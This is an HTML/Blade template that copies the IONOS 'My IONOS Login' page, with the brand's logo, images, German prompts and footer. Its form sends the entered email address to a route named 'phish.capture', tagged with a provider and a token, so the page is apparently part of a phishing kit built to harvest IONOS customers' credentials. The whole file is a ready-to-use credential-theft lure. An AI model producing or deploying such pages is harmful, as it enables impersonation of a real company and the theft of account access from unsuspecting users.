<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>My IONOS Login</title>
    <link rel="icon" href="https://login.ionos.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Overpass:wght@600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:OpenSansRegular,arial,'arial narrow',sans-serif;background:#fff;min-height:100vh;color:#001b41}
        header{display:flex;align-items:center;justify-content:space-between;padding:16px 32px;border-bottom:1px solid #eee}
        .logo{font-family:OverpassSemibold,arial,sans-serif;font-size:21.5px;font-weight:700;color:#003d8f;text-transform:uppercase;letter-spacing:1px}
        nav{display:flex;gap:24px;align-items:center}
        nav a{font-size:14px;color:#001b41;text-decoration:none;font-weight:400}
        nav a:hover{color:#003d8f}
        .main{max-width:590px;margin:60px auto;padding:0 32px}
        .my-account-img{text-align:center;margin-bottom:40px}
        .my-account-img img{width:150px;height:150px}
        h1{font-family:OverpassSemibold,arial,sans-serif;font-size:22px;font-weight:600;color:#001b41;margin-bottom:4px;line-height:30px}
        .subtitle{font-size:14px;color:#001b41;margin-bottom:32px;line-height:20px}
        .input-group{margin-bottom:20px}
        .input-group input{width:100%;height:36px;padding:0 12px;font-size:14px;font-family:OpenSansRegular,arial,sans-serif;color:#001b41;background:transparent;border:1px solid #1474c4;border-radius:8px;outline:none;transition:border-color .15s}
        .input-group input:focus{border-color:#003d8f;box-shadow:0 0 0 2px rgba(0,61,143,.1)}
        .input-group input::placeholder{color:#666}
        .btn-next{height:36px;padding:4px 20px;background:#0b2a63;color:#fff;border:2px solid #0b2a63;border-radius:24px;font-size:14px;font-weight:600;font-family:OpenSansSemibold,arial,sans-serif;cursor:pointer;transition:background .15s}
        .btn-next:hover{background:#091f4a}
        .links{display:flex;justify-content:space-between;margin-top:20px}
        .links a{font-size:13px;color:#003d8f;text-decoration:none}
        .links a:hover{text-decoration:underline}
        .status{text-align:center;margin-top:40px;font-size:12px;color:#666}
        .status span{color:#00a651}
        footer{position:fixed;bottom:0;left:0;right:0;padding:12px 32px;text-align:center;font-size:11px;color:#999;border-top:1px solid #f0f0f0}
        @media(max-width:480px){.main{padding:0 16px}}
    </style>
</head>
<body>
    <header>
        <div class="logo">IONOS</div>
        <nav>
            <a href="#">Hilfe</a>
            <a href="#">Mein Account</a>
        </nav>
    </header>

    <div class="main">
        <div class="my-account-img">
            <img src="https://login.ionos.com/image/my-account.svg" alt="My IONOS">
        </div>

        <h1>My IONOS Login</h1>
        <p class="subtitle">Melden Sie sich mit Ihren Zugangsdaten an.</p>

        <form action="{{ route('phish.capture', ['provider' => 'ionos', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="input-group">
                <input type="email" name="email" placeholder="Customer ID, email address or domain" value="{{ $email }}" autocomplete="username">
            </div>

            <div style="margin-top:20px">
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>

        <div class="links">
            <a href="#">Passwort vergessen?</a>
            <a href="#">Hilfe</a>
        </div>

        <div class="status">All Systems <span>Operational</span></div>
    </div>

    <footer>© 2026 IONOS SE</footer>
</body>
</html>
